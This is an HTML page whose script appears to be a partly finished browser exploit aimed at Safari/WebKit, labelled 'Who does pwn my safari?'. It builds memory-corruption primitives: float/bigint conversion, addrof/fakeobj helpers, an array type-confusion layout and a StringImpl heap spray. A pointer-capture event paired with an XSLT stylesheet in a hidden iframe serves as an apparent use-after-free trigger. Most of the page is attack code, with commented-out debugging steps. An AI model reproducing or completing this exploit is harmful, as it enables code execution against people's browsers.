<html>
	<body></body>
<pre id='log' style="font-size : 40px;"></pre>
<script>
	var keep = [];
	let f = new Float64Array(1);
let u = new Uint32Array(f.buffer);
	function float2bigint(v) {
  f[0] = v;
  return BigInt(u[0]) | (BigInt(u[1]) << 32n);
}
function bigint2float(v) {
  u[0] = Number(v & 0xffffffffn);
  u[1] = Number(v >> 32n);
  return f[0];
}
let addrof = null
let fakeobj = null;
for (var i = 0; i < 100; i++) { keep.push([1.1*i]);}
let a0 = [0,0,0,0,0,0,0,0,0,0];
let a1 = [0,0,0,0,0,0,0,0,0,0];
// transition to unboxed double storage
a1[3] = 13.37;
let b0 = [0,0,0,0,0,0,0,0,0,0];
let b1 = [0,0,a1,a1,0,0,0,0,0,0]; // store references to a1 to make b1 a boxed array

// put zeroes in first two slots so JSCallbackData destruction is safe
//delete b1[0];
//delete b1[1];
	/*
addrof = (val) => {
    b1[0] = val;
    return float2bigint(a1[offset]);
  }
  fakeobj = (addr) => {
    a1[offset] = bigint2float(addr);
    return b1[0];
  }*/
    function tohex(n) {
    if(n < 0) {
        n = 0xFFFFFFFF + n + 1;
    }
    return "0x" + ("00000000" + n.toString(16).toUpperCase()).substr(-8);
}
        function print(str) {
            var log = document.getElementById('log');
            console.log(str);
            if (log) {
                log.innerText += "[+] "+str + '\n';
            }
        }
        function gc() {
  for (let i = 0; i < 0x400; i++) {
    new ArrayBuffer(0x1000000);
  }
}
let g_obj_str = {};
function sprayStringImpl(start, end) {
    for (let i = start; i < end; i++) {
        let s = new String("A".repeat(0x48 - 0x14 - 5) + i.toString().padStart(5, "0"));
        g_obj_str[s] = 0x13371337;
    }
}
        let data_view = new DataView(new ArrayBuffer(8));
        floatAsQword = float => {
            data_view.setFloat64(0, float, true);
            var low = data_view.getUint32(0, true);
            var high = data_view.getUint32(4, true);
            return low + high * 0x100000000;
        }

        qwordAsFloat = qword => {
            data_view.setUint32(0, qword%0x100000000, true);
            data_view.setUint32(4, qword/0x100000000, true);
            //data_view.setBigUint64(0, qword);
            return data_view.getFloat64(0);
        }
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        async function main(){
            alert("Who does pwn my safari?");
            h1 = document.body.appendChild(document.createElement('h1'));
h1.textContent = 'please wait...';

cache_frame = document.body.appendChild(document.createElement('iframe')) //fastmalloc object
cache_frame.style.display = 'none';
pi = cache_frame.contentDocument.appendChild(
    document.createProcessingInstruction('xml-stylesheet',
        'type="text/xml" href="stylesheet.xml"'));

setTimeout(() => {
  h1.textContent = 'click me';
  debugger;
  //sprayStringImpl(0,10000)
  document.addEventListener('lostpointercapture', () => {
    document.write('x');
    document.firstChild.remove();

    document.appendChild(pi);

    document.appendChild(document.createElement('root'))
    document.close(); // triggers an XSLT transformation
    //alert(tohex(cache_frame));

  });
    
  document.addEventListener('pointerdown', (event) => {
    sprayStringImpl(0, 10000);
	//event.pointerId = 0x4141414141;
    document.body.setPointerCapture(event.pointerId);
    
    //var arr_str = Object.getOwnPropertyNames(g_obj_str);
	  /*
    for (let i = arr_str.length - 1; i > 0; i--) {
        if (arr_str[i].length > 0xff) {
            alert(arr_str[i].length)
            alert("[+] StringImpl corrupted successfully");
            var g_relative_read = arr_str[i];
            //var g_obj_str = null;
            break;
        }
    }*/
    //alert()
    let ab = new ArrayBuffer(100);
        let a = new Float64Array(ab.buffer);
        
        //event.pointerId = 
        //document.body.releasePointerCapture(event.pointerId)
        //gc()
        //event.remove()
        //var b = event.pointerId;
        //var g_arr_ab_1 = [];
        //g_arr_ab_1.push(b);
        
        //alert(tohex(event.pointerId))
	  /*for (var i = 0; i < event.pointerId +1; i++ ) {
            if(tohex(event.pointerId) == 0) {
                alert(event.pointerId)
            }
        }*/
	  debugger;
	  //alert(bigint2float(0x4141414141))
        //event.pointerId = ab.buffer;
        alert(tohex(event.pointerId))
        //g_arr_ab_1;
        

    
  });
}, 0); // enough time for the style sheet to be cached

}
        main();
</script>
</html>
